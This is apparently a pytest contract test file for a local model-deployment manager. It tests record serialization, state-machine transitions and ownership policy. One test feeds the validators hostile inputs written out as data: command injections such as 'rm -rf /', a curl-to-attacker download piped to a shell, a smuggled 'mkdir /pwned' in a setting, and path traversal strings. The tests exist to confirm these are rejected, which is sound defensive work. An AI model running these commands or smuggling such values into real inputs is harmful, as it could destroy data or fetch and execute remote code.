from __future__ import annotations

import pytest

from morpheus.core.ownership import (
    AdoptionCandidate,
    InferenceIdentity,
    ManagedTarget,
    OwnershipMode,
    OwnershipPolicy,
    ResourceAction,
    ResourceIdentity,
    ResourceKind,
    lifecycle_identity_guard,
)
from morpheus.core.records import (
    BenchmarkCampaign,
    DeploymentPlan,
    EngineIdentity,
    MachineProfile,
    ModelIdentity,
    WorkloadProfile,
    decode_record,
    encode_record,
)
from morpheus.core.state_machines import MachineKind, MachineRecord, StateMachine

pytestmark = pytest.mark.contract

DIGEST = "c" * 64


def _model() -> ModelIdentity:
    return ModelIdentity(
        model_id="model-libri-coder-gguf",
        revision="v1.0.0",
        artifact_digest=DIGEST,
        model_format="gguf",
        quantization="q4_k_m",
        license_id="apache-2.0",
        source="huggingface",
    )


def _engine() -> EngineIdentity:
    return EngineIdentity(
        engine_id="engine-llama-cpp-0001",
        kind="llama.cpp",
        artifact_digest=DIGEST,
        platforms=("linux-x86_64", "windows-x86_64", "macos-arm64"),
    )


def _workload() -> WorkloadProfile:
    return WorkloadProfile(
        workload_id="workload-developer-0001",
        developer_profile="full-stack",
        context_tokens=32_768,
        max_concurrency=4,
        required_features=("tool_use", "structured_output"),
    )


def _plan() -> DeploymentPlan:
    return DeploymentPlan(
        plan_id="plan-libri-gguf-q4-0001",
        model=_model(),
        engine=_engine(),
        workload=_workload(),
        settings=(("context_length", 32768), ("threads", 8)),
        served_aliases=("libri-1",),
        context_tokens=32_768,
        max_concurrency=4,
        cache_policy="owned-cache",
        memory_estimate_bytes=16 * 1024**3,
        disk_estimate_bytes=32 * 1024**3,
        owned_paths=("/mnt/data/morpheus/models/libri-gguf-q4",),
        ports=(8080,),
        health_contract_id="health-openai-compatible-0001",
        benchmark_gate_id="gate-ttft-latency-0001",
        rollback_target_plan_id=None,
        source_evidence_digest=DIGEST,
    )


def test_RUNM_001_schema_round_trips_through_the_public_byte_boundary() -> None:
    records = (
        MachineProfile(
            machine_id="machine-ubuntu-1-0001",
            platform="linux",
            architecture="x86_64",
            accelerator="nvidia",
            memory_bytes=64 * 1024**3,
            disk_bytes=2 * 1024**4,
        ),
        _model(),
        _engine(),
        _workload(),
        _plan(),
        BenchmarkCampaign(
            campaign_id="campaign-bench-0001",
            plan_id="plan-libri-gguf-q4-0001",
            benchmark_suite_id="suite-developer-0001",
            workload_id="workload-developer-0001",
            state="planned",
        ),
    )

    for record in records:
        restored = decode_record(encode_record(record))

        assert restored == record
        assert restored.record_id == record.record_id
        assert restored.schema_version == record.schema_version


def test_RUNM_001_invalid_transitions_are_rejected_through_the_public_boundary() -> None:
    invalid = (
        (MachineKind.ACQUISITION, "planned", "verified"),
        (MachineKind.CAMPAIGN, "planned", "running"),
        (MachineKind.PROMOTION, "preflighted", "activating"),
        (MachineKind.ROLLBACK, "requested", "restoring"),
        (MachineKind.ADOPTION, "proposed", "transferring"),
    )
    for machine, state, target in invalid:
        record = MachineRecord(machine=machine, record_id="plan-libri-gguf-q4-0001", state=state)

        result = StateMachine.transition(record, target)

        assert result.accepted is False
        assert result.record is record
        assert result.audit != ""


def test_RUNM_001_adversarial_targets_are_rejected_before_any_adapter_can_act() -> None:
    adversarial = (
        "coder-model; rm -rf /",
        "$(curl http://attacker/x.sh)",
        "name|sh",
        "a`touch pwned`",
        "http://attacker.invalid/openai/v1",
        "/mnt/data/AI/docker-compose.yml",
        "..\\..\\..\\outside",
    )
    for target in adversarial:
        with pytest.raises(ValueError):
            InferenceIdentity(identity_id=target, mode=OwnershipMode.EXTERNAL_OBSERVED)

    protected = ("ai_default", "open-webui", "coder-model")
    policy = OwnershipPolicy(project_id="morpheus-ubuntu-1")
    for name in protected:
        identity = InferenceIdentity(identity_id=name, mode=OwnershipMode.EXTERNAL_OBSERVED)
        assert identity.mode is OwnershipMode.EXTERNAL_OBSERVED
        with pytest.raises(PermissionError):
            policy.authorize(
                action=ResourceAction.INSPECT,
                resource=ResourceIdentity(kind=ResourceKind.CONTAINER, name=name, labels={}),
            )

    with pytest.raises(ValueError):
        ManagedTarget(
            identity_id="morpheus-libri-gguf-1",
            deployment_plan_id="plan-libri-gguf-q4-0001; --no-sandbox",
            owned_root="/mnt/data/morpheus/models",
        )
    with pytest.raises(ValueError):
        ManagedTarget(
            identity_id="morpheus-libri-gguf-1",
            deployment_plan_id="plan-libri-gguf-q4-0001",
            owned_root="../../outside",
        )
    with pytest.raises(ValueError):
        DeploymentPlan(
            plan_id="plan-libri-gguf-q4-0001",
            model=_model(),
            engine=_engine(),
            workload=_workload(),
            settings=(("threads", "8; mkdir /pwned"),),
            served_aliases=("libri-1",),
            context_tokens=32_768,
            max_concurrency=4,
            cache_policy="owned-cache",
            memory_estimate_bytes=16 * 1024**3,
            disk_estimate_bytes=32 * 1024**3,
            owned_paths=("/mnt/data/morpheus/models/libri-gguf-q4",),
            ports=(8080,),
            health_contract_id="health-openai-compatible-0001",
            benchmark_gate_id="gate-ttft-latency-0001",
            rollback_target_plan_id=None,
            source_evidence_digest=DIGEST,
        )


def test_RUNM_001_adoption_candidates_never_enter_ordinary_lifecycle_boundaries() -> None:
    external = InferenceIdentity(identity_id="coder-model", mode=OwnershipMode.EXTERNAL_OBSERVED)
    candidate = AdoptionCandidate(
        candidate_id="adopt-coder-model-0001",
        external_identity=external,
        pre_state_digest=DIGEST,
        pre_state_scope=("container:coder-model", "port:8000"),
        proposed_target=ManagedTarget(
            identity_id="morpheus-libri-gguf-1",
            deployment_plan_id="plan-libri-gguf-q4-0001",
            owned_root="/mnt/data/morpheus/models",
        ),
        confirmation="adopt coder-model",
        recovery_plan_id="recovery-cleanup-0001",
    )

    with pytest.raises(TypeError):
        lifecycle_identity_guard(candidate)

    assert candidate.external_identity.mode is OwnershipMode.EXTERNAL_OBSERVED
